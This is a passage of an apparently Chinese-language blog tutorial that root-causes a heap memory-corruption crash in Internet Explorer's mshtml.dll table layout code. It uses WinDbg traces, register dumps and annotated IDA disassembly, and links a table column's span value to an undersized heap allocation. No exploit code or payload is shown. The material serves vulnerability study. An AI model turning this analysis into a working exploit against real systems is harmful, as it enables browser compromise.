class="number">0x35e</span></span><br><span class="line"><span class="number">0452f</span>9b0 <span class="number">6</span>cde04a6 <span class="number">0452f</span>9c8 <span class="number">00000000</span> <span class="number">00752f</span>58 USER32!DispatchMessageW+<span class="number">0xf</span></span><br><span class="line"><span class="number">0452f</span>a28 <span class="number">6</span>cdf0446 <span class="number">05688808</span> <span class="number">00000000</span> <span class="number">006</span>ccff0 IEFRAME!CTabWindow::_TabWindowThreadProc+<span class="number">0x452</span></span><br><span class="line"><span class="number">0452f</span>ae0 <span class="number">75f</span>549bd <span class="number">00752f</span>58 <span class="number">00000000</span> <span class="number">0452f</span>afc IEFRAME!LCIETab_ThreadProc+<span class="number">0x2c1</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> C:\Windows\system32\kernel32.dll - </span><br><span class="line"><span class="number">0452f</span>af0 <span class="number">76361174</span> <span class="number">006</span>ccff0 <span class="number">0452f</span>b3c <span class="number">7741b</span>3f5 iertutil!CIsoScope::RegisterThread+<span class="number">0xab</span></span><br><span class="line">WARNING: Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line"><span class="number">0452f</span>afc <span class="number">7741b</span>3f5 <span class="number">006</span>ccff0 <span class="number">73</span>d26994 <span class="number">00000000</span> kernel32!BaseThreadInitThunk+<span class="number">0x12</span></span><br><span class="line"><span class="number">0452f</span>b3c <span class="number">7741b</span>3c8 <span class="number">75f</span>549af <span class="number">006</span>ccff0 <span class="number">00000000</span> ntdll!__RtlUserThreadStart+<span class="number">0x70</span></span><br><span class="line"><span class="number">0452f</span>b54 <span class="number">00000000</span> <span class="number">75f</span>549af <span class="number">006</span>ccff0 <span class="number">00000000</span> ntdll!_RtlUserThreadStart+<span class="number">0x1b</span></span><br></pre></td></tr></table></figure></p><p>这里可能会出现没有符号的问题，解决方法如下：<br>在windbg的窗口里输入<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-072206.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p><p>然后可以看见<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-072303.png" alt=""></p><p>分析一下<br>首先导致崩溃的（分析内容在下述代码注释了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; uf mshtml!CTableColCalc::AdjustForCol</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">67f3f152 8bff            mov     edi,edi</span><br><span class="line">67f3f154 55              push    ebp</span><br><span class="line">67f3f155 8bec            mov     ebp,esp</span><br><span class="line">67f3f157 8b08            mov     ecx,dword ptr [eax]</span><br><span class="line">67f3f159 53              push    ebx</span><br><span class="line">67f3f15a 8b5d08          mov     ebx,dword ptr [ebp+8]</span><br><span class="line">67f3f15d 57              push    edi</span><br><span class="line">67f3f15e 8bc1            mov     eax,ecx</span><br><span class="line">67f3f160 83e00f          and     eax,0Fh</span><br><span class="line">67f3f163 8d7e18          lea     edi,[esi+18h]；可以看到edi来源于esi，但是esi的处理代码并不在这个函数里，所以继续向上回溯。</span><br><span class="line">67f3f166 50              push    eax</span><br><span class="line">67f3f167 890f            mov     dword ptr [edi],ecx；向edi指向的内存里拷贝值导致crash</span><br><span class="line">67f3f169 e89eacdbff      call    mshtml!CUnitValue::IsScalerUnit (67cf9e0c)</span><br><span class="line">67f3f16e 85c0            test    eax,eax</span><br><span class="line">67f3f170 7411            je      mshtml!CTableColCalc::AdjustForCol+0x31 (67f3f183)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>这样就清楚了，我们要在上一个函数下断。<br>重启一下windbg，重新attach<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:021&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:021&gt; lmm mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">0:021&gt; sxe ld:mshtml</span><br><span class="line">0:021&gt; g</span><br></pre></td></tr></table></figure></p><p>这个时候把poc拖进去（注意到没有提示允许activeX运行）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: srv*</span><br><span class="line">Page heap: pid 0xDC4: page heap enabled with flags 0x3.</span><br><span class="line">(dc4.e34): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=00000000 ebx=00000000 ecx=0016f5d8 edx=774064f4 esi=fffffffe edi=00000000</span><br><span class="line">eip=7745e60e esp=0016f5f4 ebp=0016f620 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!LdrpDoDebuggerBreak+0x2c:</span><br><span class="line">7745e60e cc              int     3</span><br><span class="line">1:014&gt; g</span><br><span class="line">ModLoad: 691c0000 69772000   C:\Windows\System32\mshtml.dll</span><br><span class="line">eax=07237000 ebx=00000000 ecx=00171000 edx=00000000 esi=7ffda000 edi=0467b384</span><br><span class="line">eip=774064f4 esp=0467b29c ebp=0467b2f0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">774064f4 c3              ret</span><br><span class="line"></span><br><span class="line">1:025&gt; lm m mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">691c0000 69772000   mshtml     (deferred)</span><br></pre></td></tr></table></figure></p><ul><li><p>lm (List Loaded Modules)<br>lm命令显示指定的已加载模块。输出中包含模块状态和路径。</p><ul><li>m Pattern<br>指定模块名必须匹配的模板。Pattern可以包含各种通配符和修饰符。关于语法的更多信息，查看字符串通配符语法。</li></ul></li><li><p>sx 命令显示当前进程的异常列表和所有非异常的事件列表，并且显示调试器遇到每个异常和事件时的行为。</p><ul><li>sxe Break<br>当发生该异常时，在任何错误处理器被激活之前目标立即中断到调试器中。这种处理类型称为第一次处理机会。</li></ul></li><li><p>ld (Load Symbols)<br>ld 命令加载指定模块的符号并刷新所有模块信息。</p></li></ul><p>这样组合起来，就是ld制定mshtml加载，然后sxe强制在加载这个模块后断下。<br>现在我们就可以对这个函数下断了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bp mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">1:025&gt; bl</span><br><span class="line"> 0 e 692d018a     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">1:025&gt; g</span><br><span class="line">(c84.798): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.8e8): Unknown exception - code 80010108 (first chance)</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018a esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure></p><ul><li>bp, bu, bm (Set Breakpoint)<br>bp、bu和bm命令设置一个或多个软断点(software breakpoints)。可以组合位置、条件和选项来设置各种不同类型的软断点。</li><li>bl (Breakpoint List)<br>bl 命令列出已存在的断点的信息。</li><li>g 命令开始指定进程或线程的执行。这种执行将会在程序结束、遇到BreakAddress 或者其他造成调试器停止的事件发生时停止。</li></ul><p>我在调试的时候辅助了一下IDA，其实是可以不用的。<br>直接静态分析找到CalculateMinMax<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-085115.png" alt=""><br>另外这里也需要导入符号。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-085211.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-085325.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-085236.png" alt=""></p><p>单步继续跟随调试，按p就可以单步执行（ 不进入函数那种），不过其实按回车也可以。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018a esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br><span class="line">1:025&gt; </span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018c esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x2:</span><br><span class="line">692d018c 55              push    ebp</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018d esp=0467e4ac ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x3:</span><br><span class="line">692d018d 8bec            mov     ebp,esp</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018f esp=0467e4ac ebp=0467e4ac iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x5:</span><br><span class="line">692d018f 81ec90000000    sub     esp,90h</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d0195 esp=0467e41c ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xb:</span><br><span class="line">692d0195 53              push    ebx</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d0196 esp=0467e418 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xc:</span><br><span class="line">692d0196 8b5d08          mov     ebx,dword ptr [ebp+8] ss:0023:0467e4b4=0492aea8</span><br></pre></td></tr></table></figure></p><p>注意到<strong>mov     ebx,dword ptr [ebp+8] ss:0023:0467e4b4=0492aea8</strong>，[ebp+8]是参数1(知道栈吧..)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd poi(ebp+8)</span><br><span class="line">0492aea8-&gt;poi(ebp+8)  691c9868 06216f30 071d8fb8 69384918</span><br><span class="line">0492aeb8  00000001 00000000 0108080d ffffffff</span><br><span class="line">0492aec8  00000000 00000000 00000000 ffffffff</span><br><span class="line">0492aed8  0001769c 0000a7f8 00000000 00000000</span><br><span class="line">0492aee8  00000000 00412802 00000000 00000000</span><br><span class="line">0492aef8  00000000 00000001 ffffffff ffffffff</span><br><span class="line">0492af08  ffffffff ffffffff 691c9fd0 00000004</span><br><span class="line">0492af18  00000004 0497eff0 691c9fd0 00000004</span><br></pre></td></tr></table></figure><ul><li>dd    双字值(4字节)<br>默认的显示数量为32个DWORD(128字节)。</li><li>poi()<br>指定地址处的指针大小的数据。指针大小或者是 32 位或者是 64 位。在内核调试模式，大小基于目标计算机上的处理器。在 Intel Itanium 计算机上用户模式调试下，大小或者是 32 位或者是 64 位，依赖于目标应用程序。所以，如果你想得到指针大小的数据最好使用 poi 运算符。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd poi(ebp+8)</span><br><span class="line">0492aea8  691c9868 06216f30 071d8fb8 69384918</span><br><span class="line">0492aeb8  00000001 00000000 0108080d ffffffff</span><br><span class="line">0492aec8  00000000 00000000 00000000 ffffffff</span><br><span class="line">0492aed8  0001769c 0000a7f8 00000000 00000000</span><br><span class="line">0492aee8  00000000 00412802 00000000 00000000</span><br><span class="line">0492aef8  00000000 00000001 ffffffff ffffffff</span><br><span class="line">0492af08  ffffffff ffffffff 691c9fd0 00000004</span><br><span class="line">0492af18  00000004 0497eff0 691c9fd0 00000004</span><br><span class="line">1:025&gt; ln 691c9868 </span><br><span class="line">(691c9868)   mshtml!CTableLayout::`vftable&apos;   |  (691c99a8)   mshtml!CTableLayoutBlock::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure><ul><li>ln 命令显示给定地址处的或者最近的符号。</li></ul><p>可见参数1引用的是CTableLayout对象，也就是<code>&lt;table&gt;</code>标签中的对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d0199 esp=0467e418 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xf:</span><br><span class="line">692d0199 56              push    esi</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d019a esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x10:</span><br><span class="line">692d019a 8b750c          mov     esi,dword ptr [ebp+0Ch] ss:0023:0467e4b8=0467e740</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=0467e740 edi=0467e70c</span><br><span class="line">eip=692d019d esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x13:</span><br><span class="line">692d019d 8b4628          mov     eax,dword ptr [esi+28h] ds:0023:0467e768=00000000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000000 ebx=0492aea8 ecx=00412802 edx=ffffffff esi=0467e740 edi=0467e70c</span><br><span class="line">eip=692d01a0 esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x16:</span><br><span class="line">692d01a0 898574ffffff    mov     dword ptr [ebp-8Ch],eax ss:0023:0467e420=00171000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000000 ebx=0492aea8 ecx=00412802 edx=ffffffff esi=0467e740 edi=0467e70c</span><br><span class="line">eip=692d01a6 esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1c:</span><br><span class="line">692d01a6 8b4354          mov     eax,dword ptr [ebx+54h] ds:0023:0492aefc=00000001</span><br></pre></td></tr></table></figure></p><p>这里的ebx+54h指向的是table标签里的col元素的span值，在poc中只有一个span值1，所以这里赋值1.</p><p>讲道理，用windbg这样看汇编太难受了，接下来我们用IDA看吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">74</span>D3018A</span><br><span class="line">.text:<span class="number">74</span>D3018A                 mov     edi, edi</span><br><span class="line">.text:<span class="number">74</span>D3018C                 push    ebp</span><br><span class="line">.text:<span class="number">74</span>D3018D                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">74</span>D3018F                 sub     esp, <span class="number">90</span>h</span><br><span class="line">.text:<span class="number">74</span>D30195                 push    ebx             ; <span class="class"><span class="keyword">struct</span> <span class="title">tagSIZE</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">74</span>D30196                 mov     ebx, [ebp+arg_0];-&gt; 参数<span class="number">1</span>引用的是CTableLayout对象，也就是table标签在内存的对象。</span><br><span class="line">.text:<span class="number">74</span>D30199                 push    esi             ; <span class="class"><span class="keyword">struct</span> <span class="title">CTableCalcInfo</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">74</span>D3019A                 mov     esi, [ebp+arg_4]</span><br><span class="line">.text:<span class="number">74</span>D3019D                 mov     eax, [esi+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">74</span>D301A0                 mov     [ebp+var_8C], eax</span><br><span class="line">.text:<span class="number">74</span>D301A6                 mov     eax, [ebx+<span class="number">54</span>h]; -&gt; span属性值的和，我们将其标记为spansum</span><br><span class="line">.text:<span class="number">74</span>D301A9                 mov     [ebp+arg_0], eax; -&gt; arg_0=spansum</span><br><span class="line">.text:<span class="number">74</span>D301AC                 mov     eax, [ebx+<span class="number">128</span>h]</span><br><span class="line">.text:<span class="number">74</span>D301B2                 shr     eax, <span class="number">2</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">.text:<span class="number">74</span>D30293 loc_74D30293:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,<span class="keyword">int</span>)+<span class="number">105</span>j</span><br><span class="line">.text:<span class="number">74</span>D30293                 mov     edx, [ebp+arg_0];-&gt; edx=arg_0=spansum</span><br><span class="line">.text:<span class="number">74</span>D30296                 mov     eax, edx</span><br><span class="line">.text:<span class="number">74</span>D30298                 sub     eax, ecx</span><br><span class="line">.text:<span class="number">74</span>D3029A                 mov     [ebp+var_1C], eax</span><br><span class="line">.text:<span class="number">74</span>D3029D                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">74</span>D3029F                 pop     eax</span><br><span class="line">.text:<span class="number">74</span>D302A0                 setz    al</span><br><span class="line">.text:<span class="number">74</span>D302A3                 mov     [ebx+<span class="number">50</span>h], ecx</span><br><span class="line">.text:<span class="number">74</span>D302A6                 shl     eax, <span class="number">8</span></span><br><span class="line">.text:<span class="number">74</span>D302A9                 xor     eax, [ebx+<span class="number">44</span>h]</span><br><span class="line">.text:<span class="number">74</span>D302AC                 <span class="keyword">and</span>     eax, <span class="number">100</span>h</span><br><span class="line">.text:<span class="number">74</span>D302B1                 xor     [ebx+<span class="number">44</span>h], eax</span><br><span class="line">.text:<span class="number">74</span>D302B4                 test    byte ptr [esi+<span class="number">2</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">74</span>D302B8                 jnz     loc_74C5EE4D</span><br><span class="line">.text:<span class="number">74</span>D302BE</span><br><span class="line">.text:<span class="number">74</span>D302BE loc_74D302BE:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,<span class="keyword">int</span>)-D133Bj</span><br><span class="line">.text:<span class="number">74</span>D302BE                 xor     eax, eax</span><br><span class="line">.text:<span class="number">74</span>D302C0</span><br><span class="line">.text:<span class="number">74</span>D302C0 loc_74D302C0:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,<span class="keyword">int</span>)+<span class="number">1957B</span>9j</span><br><span class="line">.text:<span class="number">74</span>D302C0                 <span class="keyword">or</span>      [ebp+var_38], eax</span><br><span class="line">.text:<span class="number">74</span>D302C3                 cmp     [ebp+arg_8], edi</span><br><span class="line">.text:<span class="number">74</span>D302C6                 jnz     loc_74EC5948</span><br><span class="line">.text:<span class="number">74</span>D302CC                 mov     eax, [ebx+<span class="number">94</span>h];-&gt;CTableLayout+<span class="number">0x94</span>,用于和spansum作比较，此处标记为spancmp</span><br><span class="line">.text:<span class="number">74</span>D302D2                 shr     eax, <span class="number">2</span>;-&gt; spancmp&gt;&gt;<span class="number">2</span>即spancmp/<span class="number">4</span></span><br><span class="line">.text:<span class="number">74</span>D302D5                 cmp     eax, edx;若spancmp &gt;= spansum,则跳转，这里是<span class="number">0</span>&lt;<span class="number">1</span>，所以不跳转。</span><br><span class="line">.text:<span class="number">74</span>D302D7                 jge     <span class="keyword">short</span> loc_74D30312</span><br><span class="line">.text:<span class="number">74</span>D302D9                 cmp     edx, edi</span><br><span class="line">.text:<span class="number">74</span>D302DB                 lea     esi, [ebx+<span class="number">90</span>h]</span><br><span class="line">.text:<span class="number">74</span>D302E1                 jl      loc_74C2CE82</span><br><span class="line">.text:<span class="number">74</span>D302E7                 cmp     edx, [esi+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">74</span>D302EA                 jbe     <span class="keyword">short</span> loc_74D302FF</span><br><span class="line">.text:<span class="number">74</span>D302EC                 push    <span class="number">1</span>Ch             ; <span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line">.text:<span class="number">74</span>D302EE                 mov     eax, edx</span><br><span class="line">.text:<span class="number">74</span>D302F0                 mov     edi, esi</span><br><span class="line">.text:<span class="number">74</span>D302F2                 call    ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z ; CImplAry::EnsureSizeWorker(uint,<span class="keyword">long</span>)</span><br></pre></td></tr></table></figure><p>跟进CImplAry::EnsureSizeWorker函数，发现该函数主要用于分配堆内存，分配的内存大小，分配的内存大小为<code>spansum * 0x1C</code>,虽然此处spansum为1，但其分配的最小值为<code>0x1C * 4=0x70</code>，分配的地址保存在CtableLayout+0x9C<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">.text:74DF8F9C ; public: long __thiscall CDataAry&lt;long&gt;::EnsureSize(long)</span><br><span class="line">.text:74DF8F9C ?EnsureSize@?$CDataAry@J@@QAEJJ@Z proc near</span><br><span class="line">.text:74DF8F9C                                         ; CODE XREF: 